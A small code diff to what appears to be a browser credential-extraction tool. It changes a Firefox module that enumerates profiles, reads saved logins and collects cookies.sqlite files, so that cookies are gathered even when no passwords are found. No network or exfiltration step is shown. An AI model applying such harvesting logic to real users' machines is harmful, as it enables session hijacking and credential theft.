@@ -435,6 +435,10 @@ class Mozilla:
         for prof in self.get_firefox_profiles(path):
             log.debug(f'Profile path found: {prof}')
 
+            cookie = os.path.join(prof, 'cookies.sqlite')
+            if os.path.isfile(cookie):
+                cookies.append(cookie)
+
             creds = self.get_login_data(prof)
             if not creds:
                 log.info('Database empty')
@@ -454,9 +458,6 @@ class Mozilla:
             if pwd_found:
                 credentials[prof] = pwd_found
 
-            cookie = os.path.join(prof, 'cookies.sqlite')
-            if os.path.isfile(cookie):
-                cookies.append(cookie)
 
         ret = {}
         if cookies:
